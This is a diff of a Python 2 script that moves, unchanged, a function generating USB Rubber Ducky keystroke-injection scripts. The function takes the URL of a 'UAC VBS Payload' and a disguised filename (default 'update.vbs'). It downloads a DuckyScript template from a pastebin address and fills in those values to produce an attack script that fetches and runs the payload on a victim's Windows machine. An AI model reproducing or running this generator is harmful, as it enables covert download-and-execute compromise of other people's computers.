@@ -3,6 +3,39 @@ import urllib
 import urllib2
 import time
 import os
+
+def genscripton():
+	if os.path.isfile('DuckyScript.txt'):
+		os.remove('DuckyScript.txt')
+		
+	print "[+]Please input your UAC VBS Payload URL(Pastebin/RAW recommended):"
+	genpayon_url = raw_input().lower()
+	
+	print "[+]Please input your Payload save filename (Deafult: update.vbs):"
+	genpayon_name = raw_input().lower()
+	
+	if not genpayon_name and genpayon_url:
+		print 'Using deafult params' 
+		with open('DuckyScript.txt', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', "update.vbs")
+			the_file.write(txt)
+		print 'Payload DuckyScript.txt generated!!' 
+		time.sleep(2)
+		
+	elif genpayon_name.endswith(".vbs") and genpayon_url:
+		with open('DuckyScript.txt', 'a') as the_file:
+			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
+			txt = txt.replace('[URL]', genpayon_url)
+			txt = txt.replace('[NAME]', genpayon_name)
+			the_file.write(txt)
+		print 'Payload DuckyScript.txt generated!!' 
+		time.sleep(2)
+		
+	else:
+		print "Please input a valid URL"
+		genscripton()
 		
 def duckencode():
 	if os.path.isfile('duckencoder.jar'):
@@ -117,38 +150,7 @@ def gen():
 		gen()
 		
 		
-def genscripton():
-	if os.path.isfile('DuckyScript.txt'):
-		os.remove('DuckyScript.txt')
-		
-	print "[+]Please input your UAC VBS Payload URL(Pastebin/RAW recommended):"
-	genpayon_url = raw_input().lower()
-	
-	print "[+]Please input your Payload save filename (Deafult: update.vbs):"
-	genpayon_name = raw_input().lower()
-	
-	if not genpayon_name and genpayon_url:
-		print 'Using deafult params' 
-		with open('DuckyScript.txt', 'a') as the_file:
-			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
-			txt = txt.replace('[URL]', genpayon_url)
-			txt = txt.replace('[NAME]', "update.vbs")
-			the_file.write(txt)
-		print 'Payload DuckyScript.txt generated!!' 
-		time.sleep(2)
-		
-	elif genpayon_name.endswith(".vbs") and genpayon_url:
-		with open('DuckyScript.txt', 'a') as the_file:
-			txt = urllib.urlopen("http://pastebin.com/raw/8nYdas2y").read()
-			txt = txt.replace('[URL]', genpayon_url)
-			txt = txt.replace('[NAME]', genpayon_name)
-			the_file.write(txt)
-		print 'Payload DuckyScript.txt generated!!' 
-		time.sleep(2)
-		
-	else:
-		print "Please input a valid URL"
-		genscripton()
+
 				
 	
 def main():
